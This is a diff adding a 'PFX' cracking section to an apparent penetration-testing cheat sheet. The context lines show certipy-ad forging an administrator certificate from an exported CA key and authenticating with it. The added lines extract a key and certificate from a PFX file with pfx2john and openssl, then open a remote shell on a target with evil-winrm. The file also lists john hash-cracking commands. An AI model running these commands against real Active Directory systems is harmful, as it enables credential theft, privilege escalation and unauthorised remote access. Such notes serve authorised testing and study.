@@ -436,6 +436,13 @@ certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=
 certipy-ad -dc-ip $TARGET auth -pfx 'administrator_forged.pfx'
 
 [*] Cracking
++---------- PFX ----------+
+pfx2john auth.pfx
+openssl pkcs12 -in auth.pfx -nocerts -out auth.key-enc
+openssl rsa -in auth.key-enc -out auth.key
+openssl pkcs12 -in auth.pfx -clcerts -nokeys -out auth.crt
+evil-winrm -i $TARGET -S -k auth.key -c auth.crt
+
 +---------- John ----------+
 john hashes -w=$rockyou
 john hashes --show
